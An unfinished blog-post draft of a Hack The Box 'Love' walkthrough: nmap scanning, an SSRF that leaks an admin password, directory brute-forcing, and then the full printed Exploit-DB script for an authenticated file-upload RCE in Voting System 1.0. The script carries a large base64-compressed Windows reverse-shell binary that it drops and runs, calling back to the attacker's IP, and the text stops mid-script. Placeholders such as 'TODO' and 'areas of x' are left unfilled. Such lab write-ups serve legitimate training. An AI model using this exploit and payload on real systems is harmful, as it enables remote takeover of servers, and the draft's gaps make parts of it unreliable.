---
layout: post
title:  "Hack The Box - Love - Writeup"
date:   2000-01-01 07:00:00 +0200
tags: ["Hack The Box","OSCP"]
---
{% assign imgDir="HTB-Love-Writeup" %}

# Introduction
The hack the box machine "Love" is an Easy machine which is included in [TJnull's OSCP Preparation List](). Exploiting this machine requires knowledge in the areas of x. 

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">

By enumerating the target, it is possible to discover 

# Exploitation
We start by performing an nmap scan by executing `sudo nmap -sS -sC -sV --min-rate 10000 -p- 10.10.10.239`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `--min-rate` flag ensures that we are sening atleast 10000 packets per second to avoid long scanning times at a potential cost of reliability in the result. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that a lot of ports are open and that we are likely dealing with a Windows machine.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo nmap -sS -sC -sV --min-rate 10000 -p- 10.10.10.239@@
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 08:13 EDT
Warning: 10.10.10.239 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.239
Host is up (0.18s latency).
Not shown: 64889 closed tcp ports (reset), 627 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_http-title: 400 Bad Request
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TerminalServerCookie, X11Probe: 
|_    Host '10.10.16.4' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2022-04-13T12:39:08+00:00; +21m33s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=4/13%Time=6256BE9A%P=x86_64-pc-linux-gnu%r(NU
SF:LL,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GenericLines,
SF:49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetRequest,49,"E
SF:\0\0\x01\xffj\x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\
SF:x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOptions,49,"E\0\0
SF:\x01\xffj\x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20c
SF:onnect\x20to\x20this\x20MariaDB\x20server")%r(RTSPRequest,49,"E\0\0\x01
SF:\xffj\x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20conne
SF:ct\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,49,"E\0\0\x01\xffj\x
SF:04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20t
SF:o\x20this\x20MariaDB\x20server")%r(DNSVersionBindReqTCP,49,"E\0\0\x01\x
SF:ffj\x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect
SF:\x20to\x20this\x20MariaDB\x20server")%r(DNSStatusRequestTCP,49,"E\0\0\x
SF:01\xffj\x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20con
SF:nect\x20to\x20this\x20MariaDB\x20server")%r(Help,49,"E\0\0\x01\xffj\x04
SF:Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20to\
SF:x20this\x20MariaDB\x20server")%r(SSLSessionReq,49,"E\0\0\x01\xffj\x04Ho
SF:st\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x2
SF:0this\x20MariaDB\x20server")%r(TerminalServerCookie,49,"E\0\0\x01\xffj\
SF:x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20
SF:to\x20this\x20MariaDB\x20server")%r(Kerberos,49,"E\0\0\x01\xffj\x04Host
SF:\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20t
SF:his\x20MariaDB\x20server")%r(SMBProgNeg,49,"E\0\0\x01\xffj\x04Host\x20'
SF:10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x
SF:20MariaDB\x20server")%r(X11Probe,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\
SF:.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Maria
SF:DB\x20server")%r(FourOhFourRequest,49,"E\0\0\x01\xffj\x04Host\x20'10\.1
SF:0\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Mar
SF:iaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h06m35s, deviation: 3h30m06s, median: 21m32s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-04-13T12:38:51
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-04-13T05:38:52-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 223.48 seconds
{% endhighlight %}

We see web apps at port 80, 443, 5000, 5985, 5986, and 47001. Web applications are usually a good starting point during pentests since they can contain custom web applications with multiple vulnerabilties or host old software which already has known vulnerabilties. We can start by checking out the web applications which are reachable over HTTP. In essence, the ports 80, 5000, 5985 and 47001. Visiting these ports in a web browser, we get the forbidden and not found errors. By visiting these ports in a browser, we see that they result in a 200 OK, 403 Forbidden, 404 Not Found and 404 Not Found respectively. 

![port80](/assets/{{ imgDir }}/port80.png)

![port5000](/assets/{{ imgDir }}/port5000.png)

![port5985](/assets/{{ imgDir }}/port5985.png)

![port47001](/assets/{{ imgDir }}/port47001.png)

The login prompt does not appear to offer any possibility for us to register an account that we could use to log in. Before proceeding with any more enumeration of these web servers, we could check out the web applications which are handling HTTPS requests on port 443 and 5986. If we navigate to port 443 in Firefox, we get the self signed certificate warning below. 

![SelfSigned](/assets/{{ imgDir }}/SelfSigned.png)

If we press "Advanced..." followed by "View Certificate", we can see more information about the cert. This leaks the name of the host stage.love.htb and love.htb

![domainName](/assets/{{ imgDir }}/domainName.png)

We can add these to our /etc/hosts file as demonstrated below. This ensures that love.htb and staging.love.htb resolves to the IP address 10.10.10.239.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@echo '10.10.10.239 love.htb staging.love.htb' | sudo tee -a /etc/hosts@@
10.10.10.239 love.htb staging.love.htb
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ 
{% endhighlight %}

Next, we can try to navigate to love.htb and staging.love.htb on port 80, 443, 5000, 5985, 5986, and 47001 to see if this changes the content in any way. Upon doing this, we discover a file scanning service at [http://staging.love.htb](http://staging.love.htb). This service appears to be under construction and offers a form for receiving email updates on the progress. In addition, this pages inclues two buttons in the top-left corner. 

![staging.love.htb](/assets/{{ imgDir }}/staging.love.htb.png)

The `Home` button leads to the current page while the `Demo` button leads to the page below. This page accepts a URL and then attempts to fetch this URL to scan its content. 

![betaPHP](/assets/{{ imgDir }}/betaPHP.png)

We can check if it works by requesting it to scan a file on our host and see if we receive any web requests from the target host. To do this, we start a netcat listener on port 80 and submit the URL `http://[IP]/x` where `[IP]` is the our ip address corresponding to the VPN connection.

![scanMe](/assets/{{ imgDir }}/scanMe.png)

{% highlight none linenos %}
┌──(kali㉿kali)-[~]
└─$ @@sudo nc -lvp 80@@
listening on [any] 80 ...
@@@connect to [10.10.16.4] from love.htb [10.10.10.239]@@@ 62954
GET /x HTTP/1.1
Host: 10.10.16.4
Accept: */*

{% endhighlight %}

As can be seen above, the target connects back to us on port 80 asking for the file. This means that we have a Server Side Request Forgery (SSRF). These types of vulnerabilties are useful since x. TODO

We could try to use the SSRF vulnerability to access the web application running on port 5000 which gave us a 403 Forbidden earlier. This web application wasn't accessible from another host but it might be accessible for requests originating from the target host itself. We can try this by submitting "http://localhost:5000". Upon doing this, we discover that the web application did not reject us. Instead, it provides us with the string `@LoveIsInTheAir!!!!` which is the password of to the admin account.

![adminCreds](/assets/{{ imgDir }}/adminCreds.png)

Attempting to log in with this password and common admin usernames does not seem to work. 

![attemptLogin](/assets/{{ imgDir }}/attemptLogin.png)

Either we have the wrong admin username or we are at the wrong log in page. We can search for an admin log in page by using a directory brute forcing tool such as ffuf.

Windows host + file path routing in php => Lowercase wordlist
{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ ls -lhS /usr/share/seclists/Discovery/Web-Content/ | grep "lowercase"                            
-rw-r--r-- 1 root root   13M Jan 31 18:23 directory-list-lowercase-2.3-big.txt
-rw-r--r-- 1 root root  1.8M Jan 31 18:23 directory-list-lowercase-2.3-medium.txt
-rw-r--r-- 1 root root  937K Jan 31 18:23 raft-large-words-lowercase.txt
-rw-r--r-- 1 root root  661K Jan 31 18:23 directory-list-lowercase-2.3-small.txt
-rw-r--r-- 1 root root  483K Jan 31 18:23 raft-large-directories-lowercase.txt
-rw-r--r-- 1 root root  460K Jan 31 18:23 raft-medium-words-lowercase.txt
-rw-r--r-- 1 root root  460K Jan 31 18:23 raft-large-files-lowercase.txt
-rw-r--r-- 1 root root  305K Jan 31 18:23 raft-small-words-lowercase.txt
-rw-r--r-- 1 root root  220K Jan 31 18:23 raft-medium-directories-lowercase.txt
-rw-r--r-- 1 root root  208K Jan 31 18:23 raft-medium-files-lowercase.txt
-rw-r--r-- 1 root root  143K Jan 31 18:23 raft-small-directories-lowercase.txt
-rw-r--r-- 1 root root  138K Jan 31 18:23 raft-small-files-lowercase.txt
-rw-r--r-- 1 root root   20K Jan 31 18:23 raft-large-extensions-lowercase.txt
-rw-r--r-- 1 root root  9.4K Jan 31 18:23 raft-medium-extensions-lowercase.txt
-rw-r--r-- 1 root root  6.9K Jan 31 18:23 raft-small-extensions-lowercase.txt
                            
┌──(kali㉿kali)-[/tmp/x]
└─$
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[~]
└─$ @@ffuf -u http://love.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt@@

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://love.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

images                  [Status: 301, Size: 330, Words: 22, Lines: 10]
includes                [Status: 301, Size: 332, Words: 22, Lines: 10]
@@@admin@@@                   [Status: 301, Size: 329, Words: 22, Lines: 10]
plugins                 [Status: 301, Size: 331, Words: 22, Lines: 10]
webalizer               [Status: 403, Size: 298, Words: 22, Lines: 10]
phpmyadmin              [Status: 403, Size: 298, Words: 22, Lines: 10]
dist                    [Status: 301, Size: 328, Words: 22, Lines: 10]
tcpdf                   [Status: 301, Size: 329, Words: 22, Lines: 10]
licenses                [Status: 403, Size: 417, Words: 37, Lines: 12]
server-status           [Status: 403, Size: 417, Words: 37, Lines: 12]
                        [Status: 200, Size: 4388, Words: 654, Lines: 126]
con                     [Status: 403, Size: 298, Words: 22, Lines: 10]
aux                     [Status: 403, Size: 298, Words: 22, Lines: 10]
:: Progress: [17770/17770] :: Job [1/1] :: 959 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
{% endhighlight %}

we find the same login prompt at /admin. However, if we fill in the same credentials and press "Sign In" we are successfully logged in as a user named "Neovic Devierte".

![attemptLoginAdmin](/assets/{{ imgDir }}/attemptLoginAdmin.png)

![logInOK](/assets/{{ imgDir }}/logInOK.png)

We can search for known exploits for this web server using searchsploit. Upon doing this, we find an [authenticated remote code execution exploit]() for version 1.0 of a PHP web application named "Voting System". We copy this exploit to a file named "exploit.py" in the current directory and inspect it with `nano`. 
We could also choose the sqli.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ searchsploit "voting system RCE"
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Online Voting System 1.0 - SQLi (Authentication Bypass) + Remote Code Execution | php/webapps/50088.py
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)       | php/webapps/49445.py
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                  
┌──(kali㉿kali)-[/tmp/x]
└─$ searchsploit -p 49445           
  Exploit: Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)
      URL: https://www.exploit-db.com/exploits/49445
     Path: /usr/share/exploitdb/exploits/php/webapps/49445.py
File Type: Python script, ASCII text executable, with very long lines (6002)

Copied EDB-ID #49445's path to the clipboard
                                                                                                                  
┌──(kali㉿kali)-[/tmp/x]
└─$ cp /usr/share/exploitdb/exploits/php/webapps/49445.py ./exploit.py
                                                                                                                  
┌──(kali㉿kali)-[/tmp/x]
└─$ nano exploit.py 
{% endhighlight %}

{% highlight python linenos %}
# Exploit Title: Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)
# Date: 19/01/2021
# Exploit Author: Richard Jones
# Vendor Homepage:https://www.sourcecodester.com/php/12306/voting-system-using-php.html
# Software Link: https://www.sourcecodester.com/download-code?nid=12306&title=Voting+System+using+PHP%2FMySQLi+with+Source+Code
# Version: 1.0
# Tested on: Windows 10 2004 + XAMPP 7.4.4

import requests

# --- Edit your settings here ----
IP = "love.htb" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.16.4" # Reverse shell IP
REV_PORT = "8888" # Reverse port
# --------------------------------

INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"

payload = """

<?php

header('Content-type: text/plain');
$ip   = "IIPP";
$port = "PPOORRTT";
$payload = "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";
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\\windows\\temp";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);

?>
"""
payload = payload.replace("IIPP", REV_IP)
payload = payload.replace("PPOORRTT", REV_PORT)

s = requests.Session()

def getCookies():
    r = s.get(INDEX_PAGE)
    return r.cookies

def login():
    cookies = getCookies()
    data = {
        "username":USERNAME,
        "password":PASSWORD,
        "login":""
    }
    r = s.post(LOGIN_URL, data=data, cookies=cookies)
    if r.status_code == 200:
        print("Logged in")
        return True
    else:
        return False

def sendPayload():
    if login():
        global payload
        payload = bytes(payload, encoding="UTF-8")
        files  = {'photo':('shell.php',payload,
                    'image/png', {'Content-Disposition': 'form-data'}
                  )
              }
        data = {
            "firstname":"a",
            "lastname":"b",
            "password":"1",
            "add":""
        }
        r = s.post(VOTE_URL, data=data, files=files)
        if r.status_code == 200:
            print("Poc sent successfully")
        else:
